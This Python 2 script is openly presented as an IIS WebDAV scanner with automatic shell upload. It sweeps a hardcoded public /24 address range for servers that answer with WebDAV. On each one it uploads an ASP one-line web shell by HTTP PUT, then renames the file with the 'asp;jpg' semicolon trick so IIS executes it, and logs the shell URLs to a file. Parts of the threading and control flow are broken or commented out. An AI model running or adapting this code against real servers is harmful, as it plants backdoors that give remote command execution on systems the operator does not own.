#!/usr/bin/python

#This is the Python Script which Scans for IIS Servers which has WebDav Exploitable and autoupload shell and gives you access :)
#PYTHON IIS SCANNER WITH AUTO UPLOADING SHELL (WEB DAV EXPLOIT)
#http://www.subhashdasyam.com/2011/04/python-iis-scanner-with-auto-uploading.html



import socket,re,urllib,urllib2,os,sys
from threading import Thread
import subprocess
from Queue import Queue
from IPy import IP

num_ping_threads = 8
num_arp_threads = 8
in_queue = Queue()
out_queue = Queue()

def options(i, iq, oq):
	while True:
		try:
			ip = iq.get()
			#print "thread %s start test ip:%s" % (i,ip)
			sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((ip,t_port))
			req = "OPTIONS / HTTP/1.1\r\n"
			req += "Host: " + ip + "\r\n"
			req += "Connection: close\r\n"
			#req += "Accept: *\r\n"
			req += "\r\n\r\n"
			#print req
			sock.send(req)
			data = sock.recv(1024)
			sock.close()
			r1 = re.compile('DAV')
			result = r1.findall(data)
			if result == []:
				print "On bad.%s.the web DAV is not open.\n" % ip
			else:       
				print "WA HAHA LET US CHECK MORE time"
				oq.put(ip)
				return None
				iq.task_done()
		except:
				print "cannot connect ip:%s" % ip
				iq.task_done()
        
def put(i,oq):
    try:
        ip = oq.get()
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip,t_port))
        text = '<%execute request("hacker")%>'
        print "File content:\n" + text
        file_length = len(text)
        req = "PUT /" + 'temp003.txt' +" HTTP/1.1\r\n"
        req += "Connection: close\r\n"
        req += "Host: " + ip + "\r\n"
        req += "Content-Type: text/xml; charset='utf-8'\r\n"
        req += "Content-Length: " + str(file_length) +"\r\n\r\n"
        req += text + "\r\n"
        sock.send(req)
        data = sock.recv(1024)
        sock.close()
        r2 = re.compile('OK')
        result = r2.findall(data)
        if result == []:
            print "On bad...the web is not wirrten.\n"
        else:     
            print "OK code uploaded"
            print "\ncode here " + 'http://'+ip+'/'+'temp003.txt'
        oq.task_done()
    except:
        print "connect fail:%s" % ip
        oq.task_done()

def move():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    req = "MOVE /" + 'temp003.txt' +" HTTP/1.1\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "Destination: http://" + t_IP +'/'+ 'temp003.asp;jpg'+"\n\n"
    sock.send(req)
    data = sock.recv(1024)
    sock.close()
    r3 = re.compile('asp')
    result = r3.findall(data)
    if result == []:
        print "On bad...the web is not wirrten.\n"
    else:
        print "\n_shell :D and check RESULT.TXT \nhttp://" + t_IP +'/'+ 'temp003.asp;jpg'+"\n\n"
        temp="http://" + t_IP +'/'+ 'temp003.asp;jpg'
        os.system('echo'+' '+ temp +' >>RESULT.txt')


		

t_port = 80

print "\===============Auto Upload Shell=================="
print "\n[1] Check the Vulnerability"
#IP=raw_input("enter your target ip like 1.1.1.0/24:")
#inp = raw_input("enter your choice:")
#if inp == '1':
# options()
# if options() is None:
#   put()
#    move()

#IP=raw_input("enter your txt position:")
#f=open(IP,'r')
#lines=f.readlines()
#print "input info" + IP
lines = IP("222.35.2.0/24")

#b = 'nmap'+' '+'--open '+''+'-p 80 ' + '' + IP
#print b +'\r\n'+'Now go for find the dork server'
#a = str(os.popen(b).readlines())
#r1 = re.compile("\d*\.\d*\.\d*\.\d*")
#ip = r1.findall(a)
ips=[]

#if ip==[]:
#   sys.exit()
for x in lines:
    #x=x.strip()
    ips.append(x)

"""
for y in ips:
     t_IP = y
    
     try:
          print 'now scan the '+y
          #t=options()
          if options() is None:
              print "noting to do"
          else:
              print "start test" 
              #put()
              #move()
			  print "Done.Enjoy the Shell"+y
			  find.append(y)
     except:
		continue
		
		
for z in find:
	print "find shell"+z
	
"""
response = 0
#place ip into in queue	
for ip in ips:
    #in_queue.put(ip)
	#response = os.system("ping -c 1"+ ip +"> /dev/null 2>&1")
        cmd = 'ping -c 1 %s > /dev/null 2>&1' % ip
	response = os.system(cmd)
	if response != 0:
		print "Target down:%s!" % ip
	else:	
		print "add ip:%s" % ip
		in_queue.put(ip)
    
	

#spawn pool of optins threads
for i in range(num_ping_threads):
    worker = Thread(target=options, args=(i, in_queue,out_queue))
    worker.setDaemon(True)
    worker.start()
	
#spawn pool of put threads
for i in range(num_arp_threads):
    worker = Thread(target=put,args=(i,out_queue))
    worker.setDaemon(True)
    worker.start()


print "Main Thread Waiting"
in_queue.join()
out_queue.join()
print "Done"
	
	
